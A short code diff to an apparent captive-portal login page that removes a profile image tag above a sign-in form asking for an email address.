@@ -129,7 +129,6 @@ require_once('helper.php');
 
         <div class="account-wall">
 
-          <img class="profile-img" src="assets/img/yqczrisvt2.png" alt="">
 
           <form method="POST" action="/captiveportal/index.php" class="form-signin" onsubmit="redirect()">
             <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
